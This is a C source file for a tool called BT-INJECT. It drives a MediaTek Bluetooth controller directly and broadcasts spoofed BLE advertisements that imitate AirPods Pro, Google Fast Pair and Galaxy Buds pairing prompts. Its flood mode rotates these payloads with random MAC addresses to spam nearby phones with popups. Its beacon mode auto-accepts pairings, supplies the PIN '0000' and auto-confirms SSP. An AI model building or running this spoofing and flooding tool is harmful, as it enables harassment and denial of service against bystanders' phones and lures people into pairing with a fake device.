#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <stdint.h>
#include <time.h>

#define BT_DEV "/dev/stpbt"

static volatile int g_running = 1;
static void sig_handler(int sig) {
    (void)sig;
    g_running = 0;
}

static int send_hci_cmd(int fd, const uint8_t *cmd, size_t len, uint8_t *resp, size_t resp_max) {
    ssize_t written = write(fd, cmd, len);
    if (written < 0) return -1;

    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(fd, &fds);
    struct timeval tv = { .tv_sec = 1, .tv_usec = 0 };

    int ret = select(fd + 1, &fds, NULL, NULL, &tv);
    if (ret <= 0) return -1;

    ssize_t n = read(fd, resp, resp_max);
    return (int)n;
}

// Pre-crafted BLE Advertising Payloads (Max 31 bytes total)
// --- 1. Original RAW Ecosystem Payloads ---
// Raw Apple Continuity Proximity Pairing (AirPods Pro setup popup for iOS - 30 bytes)
static const uint8_t APPLE_AIRPODS_PRO_RAW[] = {
    0x1E, // Length = 30 bytes
    0xFF, // AD Type: Manufacturer Specific
    0x4C, 0x00, // Apple Inc. (0x004C)
    0x07, 0x19, // Type: Proximity Pairing, Len: 25
    0x01,       // Prefix
    0x0E, 0x20, // Model: AirPods Pro (0x0E20)
    0x55,       // Status flags
    0x55,       // Battery levels (left/right/case)
    0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Raw Google Fast Pair Device Announcement (6 bytes)
static const uint8_t GOOGLE_FAST_PAIR_RAW[] = {
    0x06, // Length = 6 bytes
    0x16, // AD Type: Service Data - 16-bit UUID
    0x2C, 0xFE, // Fast Pair UUID (0xFE2C)
    0xCD, 0x82, 0x54 // Model ID
};

// Raw Samsung Galaxy Buds Popup (24 bytes)
static const uint8_t SAMSUNG_BUDS_RAW[] = {
    0x18, // Length = 24 bytes
    0xFF, // AD Type: Manufacturer Specific
    0x75, 0x00, // Samsung Electronics (0x0075)
    0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
    0x2E, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// Raw Apple iBeacon (26 bytes)
static const uint8_t IBEACON_PAYLOAD_RAW[] = {
    0x1A, // Length = 26 bytes
    0xFF, // Manufacturer Specific
    0x4C, 0x00, // Apple Inc
    0x02, 0x15, // iBeacon Type (0x02) & Sub-len (0x15 = 21 bytes)
    0xE2, 0xC5, 0x6D, 0xB5, 0xDF, 0xFB, 0x48, 0xD2, // UUID part 1
    0xB0, 0x60, 0xD0, 0xF5, 0xA7, 0x10, 0x96, 0xE0, // UUID part 2
    0x00, 0x01, // Major (1)
    0x00, 0x01, // Minor (1)
    0xC5        // Measured Power (-59 dBm)
};

// --- 2. Android Compatible Payloads (--andc: Flags + Local Name for Android Pair List) ---
static const uint8_t APPLE_AIRPODS_PRO_ANDC[] = {
    0x02, 0x01, 0x06, // Flags
    0x0C, 0x09, 'A', 'i', 'r', 'P', 'o', 'd', 's', ' ', 'P', 'r', 'o', // Complete Local Name
    0x0E, 0xFF, 0x4C, 0x00, 0x07, 0x09, 0x01, 0x0E, 0x20, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00
};

static const uint8_t GOOGLE_FAST_PAIR_ANDC[] = {
    0x02, 0x01, 0x06, // Flags
    0x0B, 0x09, 'P', 'i', 'x', 'e', 'l', ' ', 'B', 'u', 'd', 's', // Complete Local Name
    0x03, 0x03, 0x2C, 0xFE, // Fast Pair UUID 0xFE2C
    0x06, 0x16, 0x2C, 0xFE, 0x2C, 0x00, 0x00
};

static const uint8_t SAMSUNG_BUDS_ANDC[] = {
    0x02, 0x01, 0x06, // Flags
    0x0C, 0x09, 'G', 'a', 'l', 'a', 'x', 'y', ' ', 'B', 'u', 'd', 's', // Complete Local Name
    0x0D, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00
};

static const uint8_t IBEACON_PAYLOAD_ANDC[] = {
    0x02, 0x01, 0x06, // Flags
    0x0B, 0x09, 'i', 'B', 'e', 'a', 'c', 'o', 'n', ' ', 'B', 'T', // Complete Local Name
    0x0E, 0xFF, 0x4C, 0x00, 0x02, 0x15, 0xE2, 0xC5, 0x6D, 0xB5, 0xDF, 0xFB, 0x00, 0x01, 0x00
};

static void print_banner(void) {
    printf("\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n");
    printf("\033[1;37m        BT-INJECT: MTK Packet Injector\033[0m\n");
    printf("\033[1;30m     Hardware Baseband Engine (/dev/stpbt)\033[0m\n");
    printf("\033[1;35m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n");
}

static void show_help(const char *prog) {
    print_banner();
    printf("Usage: %s [mode] [options]\n\n", prog);
    printf("Modes:\n");
    printf("  --airpods         Broadcast Apple AirPods Pro pairing prompt\n");
    printf("  --fastpair        Broadcast Google Fast Pair device announcement\n");
    printf("  --samsung         Broadcast Samsung Galaxy Buds pairing notification\n");
    printf("  --ibeacon         Broadcast standard Apple iBeacon advertisement\n");
    printf("  --name <str>      Broadcast custom device name in pairing list\n");
    printf("  --custom <hex>    Inject arbitrary raw HCI command frame in hex\n");
    printf("  --spam            Continuous rotating multi-vector BLE popup & pair flood\n\n");
    printf("Options:\n");
    printf("  --andc            Android compatible mode (appends Flags & Name for Android Pair list)\n");
    printf("  -i, --interval    Beacon transmission interval in ms (default: 50)\n");
    printf("  -d, --duration    Duration in seconds (default: 15, 0 = infinite)\n");
    printf("  -h, --help        Show this help message\n\n");
}

static void set_random_mac(int fd, uint8_t *resp) {
    // HCI_LE_Set_Random_Address: OpCode 0x2005 (OGF 0x08, OCF 0x0005)
    uint8_t cmd_mac[10];
    cmd_mac[0] = 0x01;
    cmd_mac[1] = 0x05;
    cmd_mac[2] = 0x20;
    cmd_mac[3] = 0x06;
    for (int i = 0; i < 6; i++) {
        cmd_mac[4 + i] = (uint8_t)(rand() & 0xFF);
    }
    cmd_mac[9] |= 0xC0; // Static random address top 2 bits must be 11
    send_hci_cmd(fd, cmd_mac, sizeof(cmd_mac), resp, 64);
}

static void inject_adv_data(int fd, const uint8_t *ad, size_t ad_len, uint8_t *resp) {
    // 0. Disable Advertising before changing parameters (avoids 0x0C Command Disallowed)
    uint8_t cmd_disable[] = { 0x01, 0x0a, 0x20, 0x01, 0x00 };
    send_hci_cmd(fd, cmd_disable, sizeof(cmd_disable), resp, 64);

    // 1. LE_Set_Advertising_Parameters: OpCode 0x2006 (interval=32 = 20ms, ADV_IND)
    uint8_t cmd_param[] = {
        0x01, 0x06, 0x20, 0x0F,
        0x20, 0x00, // Min Interval: 0x0020 (20ms)
        0x30, 0x00, // Max Interval: 0x0030 (30ms)
        0x00,       // Adv Type: Connectable undirected (ADV_IND)
        0x01,       // Own Addr Type: Random Device Address
        0x00,       // Peer Addr Type: Public
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Peer Addr
        0x07,       // Adv Channel Map: 37, 38, 39 (all 3 channels)
        0x00        // Filter Policy: Allow any
    };
    send_hci_cmd(fd, cmd_param, sizeof(cmd_param), resp, 64);

    // 2. LE_Set_Advertising_Data: OpCode 0x2008 (len=32: [len, data...])
    uint8_t cmd_data[36] = {0};
    cmd_data[0] = 0x01;
    cmd_data[1] = 0x08;
    cmd_data[2] = 0x20;
    cmd_data[3] = 0x20; // 32 bytes parameter length
    if (ad_len > 31) ad_len = 31;
    cmd_data[4] = (uint8_t)ad_len;
    memcpy(&cmd_data[5], ad, ad_len);
    send_hci_cmd(fd, cmd_data, sizeof(cmd_data), resp, 64);

    // 3. LE_Set_Advertise_Enable: OpCode 0x200A
    uint8_t cmd_enable[] = { 0x01, 0x0a, 0x20, 0x01, 0x01 };
    send_hci_cmd(fd, cmd_enable, sizeof(cmd_enable), resp, 64);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        show_help(argv[0]);
        return 1;
    }

    int mode = 0; // 1=airpods, 2=fastpair, 3=samsung, 4=ibeacon, 5=custom, 6=spam, 7=name
    int android_compat = 0;
    int interval_ms = 50;
    int duration_sec = 15;
    const char *custom_hex = NULL;
    const char *dev_name = NULL;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--airpods")) mode = 1;
        else if (!strcmp(argv[i], "--fastpair")) mode = 2;
        else if (!strcmp(argv[i], "--samsung")) mode = 3;
        else if (!strcmp(argv[i], "--ibeacon")) mode = 4;
        else if (!strcmp(argv[i], "--spam")) mode = 6;
        else if (!strcmp(argv[i], "--andc")) android_compat = 1;
        else if (!strcmp(argv[i], "--name") && i + 1 < argc) { mode = 7; dev_name = argv[++i]; }
        else if (!strcmp(argv[i], "--custom") && i + 1 < argc) { mode = 5; custom_hex = argv[++i]; }
        else if (!strcmp(argv[i], "-i") && i + 1 < argc) interval_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-d") && i + 1 < argc) duration_sec = atoi(argv[++i]);
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) { show_help(argv[0]); return 0; }
    }

    if (mode == 0) {
        show_help(argv[0]);
        return 1;
    }

    print_banner();
    printf("[*] Connecting to MT6631 Bluetooth Hardware Baseband (/dev/stpbt)...\n");
    int fd = open(BT_DEV, O_RDWR | O_NOCTTY);
    if (fd < 0) {
        fprintf(stderr, "[-] Failed to open %s: %s\n", BT_DEV, strerror(errno));
        return 1;
    }
    printf("\033[1;32m[+] Radio online (WMT power enabled).\033[0m\n");
    if (android_compat) {
        printf("\033[1;36m[+] Android Compatibility Mode (--andc) Active: Flags + Device Names Enabled.\033[0m\n");
    }

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    srand(time(NULL));

    uint8_t rx_buf[128];
    uint8_t cmd_reset[] = { 0x01, 0x03, 0x0c, 0x00 };
    send_hci_cmd(fd, cmd_reset, sizeof(cmd_reset), rx_buf, sizeof(rx_buf));

    if (mode == 5) {
        // Custom Raw Hex Injection
        size_t hlen = strlen(custom_hex);
        if (hlen % 2 != 0) {
            fprintf(stderr, "[-] Hex string must have an even length!\n");
            close(fd);
            return 1;
        }
        size_t bin_len = hlen / 2;
        uint8_t *raw_pkt = malloc(bin_len);
        for (size_t i = 0; i < bin_len; i++) {
            sscanf(&custom_hex[i * 2], "%02hhx", &raw_pkt[i]);
        }
        printf("[*] Injecting %zu bytes raw HCI frame...\n", bin_len);
        int resp_len = send_hci_cmd(fd, raw_pkt, bin_len, rx_buf, sizeof(rx_buf));
        if (resp_len > 0) {
            printf("\033[1;32m[+] Controller Ack [%d bytes]:\033[0m ", resp_len);
            for (int i = 0; i < resp_len; i++) printf("%02X ", rx_buf[i]);
            printf("\n");
        }
        free(raw_pkt);
    } else if (mode == 6) {
        // Multi-vector flood (rotates MAC every burst)
        printf("[*] Starting Multi-Vector BLE Popup Flood Engine...\n");
        printf("[*] Mode: %s\n", android_compat ? "Android-Compatible (with Flags & Device Names)" : "Raw Protocol Frames");
        printf("[*] Burst Interval: %d ms | Duration: %d seconds\n\n", interval_ms, duration_sec);

        time_t start_time = time(NULL);
        uint64_t tx_bursts = 0;

        while (g_running) {
            if (duration_sec > 0 && (time(NULL) - start_time) >= duration_sec) break;

            set_random_mac(fd, rx_buf);

            int sub = (tx_bursts % 4) + 1;
            if (android_compat) {
                if (sub == 1) inject_adv_data(fd, APPLE_AIRPODS_PRO_ANDC, sizeof(APPLE_AIRPODS_PRO_ANDC), rx_buf);
                else if (sub == 2) inject_adv_data(fd, GOOGLE_FAST_PAIR_ANDC, sizeof(GOOGLE_FAST_PAIR_ANDC), rx_buf);
                else if (sub == 3) inject_adv_data(fd, SAMSUNG_BUDS_ANDC, sizeof(SAMSUNG_BUDS_ANDC), rx_buf);
                else inject_adv_data(fd, IBEACON_PAYLOAD_ANDC, sizeof(IBEACON_PAYLOAD_ANDC), rx_buf);
            } else {
                if (sub == 1) inject_adv_data(fd, APPLE_AIRPODS_PRO_RAW, sizeof(APPLE_AIRPODS_PRO_RAW), rx_buf);
                else if (sub == 2) inject_adv_data(fd, GOOGLE_FAST_PAIR_RAW, sizeof(GOOGLE_FAST_PAIR_RAW), rx_buf);
                else if (sub == 3) inject_adv_data(fd, SAMSUNG_BUDS_RAW, sizeof(SAMSUNG_BUDS_RAW), rx_buf);
                else inject_adv_data(fd, IBEACON_PAYLOAD_RAW, sizeof(IBEACON_PAYLOAD_RAW), rx_buf);
            }

            printf("\r\033[1;31m[MULTI-VECTOR #%llu]\033[0m Dispatched Rotating BLE Vector (%s) ", 
                (unsigned long long)++tx_bursts, sub==1?"Apple AirPods":sub==2?"Pixel Buds":sub==3?"Galaxy Buds":"iBeacon");
            fflush(stdout);
            usleep(interval_ms * 1000);
        }
        printf("\n\n\033[1;32m[✓] Flood complete! Total bursts dispatched: %llu\033[0m\n", (unsigned long long)tx_bursts);
    } else {
        // Persistent Beacon Mode (Holds fixed MAC so scanning phones can discover and list the device)
        set_random_mac(fd, rx_buf);

        const uint8_t *payload = NULL;
        size_t plen = 0;
        uint8_t custom_name_buf[32];

        if (mode == 1) {
            payload = android_compat ? APPLE_AIRPODS_PRO_ANDC : APPLE_AIRPODS_PRO_RAW;
            plen = android_compat ? sizeof(APPLE_AIRPODS_PRO_ANDC) : sizeof(APPLE_AIRPODS_PRO_RAW);
            printf("[*] Mode: Apple AirPods Pro (%s)\n", android_compat ? "Android Compatible: Flags + Name + Proximity" : "Raw iOS Proximity Pairing Frame");
        } else if (mode == 2) {
            payload = android_compat ? GOOGLE_FAST_PAIR_ANDC : GOOGLE_FAST_PAIR_RAW;
            plen = android_compat ? sizeof(GOOGLE_FAST_PAIR_ANDC) : sizeof(GOOGLE_FAST_PAIR_RAW);
            printf("[*] Mode: Google Fast Pair (%s)\n", android_compat ? "Android Compatible: Flags + Name + UUID" : "Raw Fast Pair Service Data");
        } else if (mode == 3) {
            payload = android_compat ? SAMSUNG_BUDS_ANDC : SAMSUNG_BUDS_RAW;
            plen = android_compat ? sizeof(SAMSUNG_BUDS_ANDC) : sizeof(SAMSUNG_BUDS_RAW);
            printf("[*] Mode: Samsung Galaxy Buds (%s)\n", android_compat ? "Android Compatible: Flags + Name + Buds Data" : "Raw Samsung Buds Frame");
        } else if (mode == 4) {
            payload = android_compat ? IBEACON_PAYLOAD_ANDC : IBEACON_PAYLOAD_RAW;
            plen = android_compat ? sizeof(IBEACON_PAYLOAD_ANDC) : sizeof(IBEACON_PAYLOAD_RAW);
            printf("[*] Mode: Apple iBeacon (%s)\n", android_compat ? "Android Compatible" : "Raw iBeacon Frame");
        } else if (mode == 7) {
            // Build custom name payload
            // Flags (3 bytes) + Complete Local Name (len + 1)
            size_t nlen = strlen(dev_name);
            if (nlen > 26) nlen = 26; // max 31 - 3 (flags) - 2 (name header) = 26
            custom_name_buf[0] = 0x02; custom_name_buf[1] = 0x01; custom_name_buf[2] = 0x06;
            custom_name_buf[3] = (uint8_t)(nlen + 1);
            custom_name_buf[4] = 0x09; // Complete Local Name
            memcpy(&custom_name_buf[5], dev_name, nlen);
            payload = custom_name_buf;
            plen = 3 + 2 + nlen;
            printf("[*] Mode: Custom Device Name ('%s')\n", dev_name);
        }

        inject_adv_data(fd, payload, plen, rx_buf);
        printf("\033[1;32m[+] Beacon active on RF channels 37, 38, 39!\033[0m\n");
        printf("\033[1;36m[+] Auto-Accept Connection Engine: ACTIVE\033[0m\n");
        printf("[*] Target duration: %d seconds (0 = infinite / Press Ctrl+C to stop)\n", duration_sec);
        printf("[*] Open Bluetooth on your phone and tap to pair!\n\n");

        time_t start_time = time(NULL);
        while (g_running) {
            int elapsed = (int)(time(NULL) - start_time);
            if (duration_sec > 0 && elapsed >= duration_sec) break;

            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(fd, &fds);
            struct timeval tv = { .tv_sec = 0, .tv_usec = 500000 };

            int ret = select(fd + 1, &fds, NULL, NULL, &tv);
            if (ret > 0) {
                ssize_t n = read(fd, rx_buf, sizeof(rx_buf));
                if (n >= 2 && rx_buf[0] == 0x04) { // HCI Event
                    uint8_t evt = rx_buf[1];
                    if (evt == 0x3E && n >= 5) { // LE Meta Event
                        uint8_t subevt = rx_buf[3];
                        if (subevt == 0x01 && n >= 15) { // LE Connection Complete
                            uint8_t status = rx_buf[4];
                            uint16_t handle = rx_buf[5] | (rx_buf[6] << 8);
                            uint8_t *bd = &rx_buf[8];
                            if (status == 0x00) {
                                printf("\n\033[1;32m[BLE CONNECT ACCEPTED]\033[0m Connected to Peer: \033[1;37m%02X:%02X:%02X:%02X:%02X:%02X\033[0m (Handle: 0x%04X)\n",
                                       bd[5], bd[4], bd[3], bd[2], bd[1], bd[0], handle);
                            }
                        }
                    } else if (evt == 0x04 && n >= 12) { // Classic Connection Request
                        uint8_t *bd = &rx_buf[3];
                        printf("\n\033[1;35m[PAIR REQUEST]\033[0m Incoming from \033[1;37m%02X:%02X:%02X:%02X:%02X:%02X\033[0m -> Auto-Accepting...\n",
                               bd[5], bd[4], bd[3], bd[2], bd[1], bd[0]);
                        uint8_t accept_cmd[11] = { 0x01, 0x09, 0x04, 0x07 };
                        memcpy(&accept_cmd[4], bd, 6);
                        accept_cmd[10] = 0x01; // Slave
                        write(fd, accept_cmd, sizeof(accept_cmd));
                    } else if (evt == 0x16 && n >= 9) { // PIN Request
                        uint8_t *bd = &rx_buf[3];
                        uint8_t pin[27] = { 0x01, 0x0D, 0x04, 0x17 };
                        memcpy(&pin[4], bd, 6);
                        pin[10] = 4;
                        memcpy(&pin[11], "0000", 4);
                        write(fd, pin, sizeof(pin));
                    } else if (evt == 0x17 && n >= 9) { // Link Key Request
                        uint8_t *bd = &rx_buf[3];
                        uint8_t neg[10] = { 0x01, 0x0C, 0x04, 0x06 };
                        memcpy(&neg[4], bd, 6);
                        write(fd, neg, sizeof(neg));
                    } else if (evt == 0x33 && n >= 13) { // User Confirmation (SSP)
                        uint8_t *bd = &rx_buf[3];
                        printf("  \033[1;32m[✓]\033[0m Auto-Confirming SSP Pairing for %02X:%02X:%02X:%02X:%02X:%02X...\n",
                               bd[5], bd[4], bd[3], bd[2], bd[1], bd[0]);
                        uint8_t conf[10] = { 0x01, 0x2C, 0x04, 0x06 };
                        memcpy(&conf[4], bd, 6);
                        write(fd, conf, sizeof(conf));
                    } else if (evt == 0x05 && n >= 7) { // Disconnection Complete
                        uint16_t handle = rx_buf[4] | (rx_buf[5] << 8);
                        printf("\n\033[1;33m[DISCONNECT]\033[0m Handle 0x%04X disconnected -> Resuming Broadcast...\n", handle);
                        // Re-enable advertising
                        uint8_t cmd_en[] = { 0x01, 0x0a, 0x20, 0x01, 0x01 };
                        write(fd, cmd_en, sizeof(cmd_en));
                    }
                }
            } else {
                printf("\r\033[1;36m[TX ON AIR]\033[0m Broadcasting & Listening... Elapsed: %d/%ds ", elapsed, duration_sec);
                fflush(stdout);
            }
        }
        printf("\n\n\033[1;32m[✓] Broadcast finished.\033[0m\n");
    }

    // Stop advertising & reset
    uint8_t cmd_disable[] = { 0x01, 0x0a, 0x20, 0x01, 0x00 };
    send_hci_cmd(fd, cmd_disable, sizeof(cmd_disable), rx_buf, sizeof(rx_buf));
    close(fd);
    printf("[*] Radio powered down cleanly.\n");
    return 0;
}
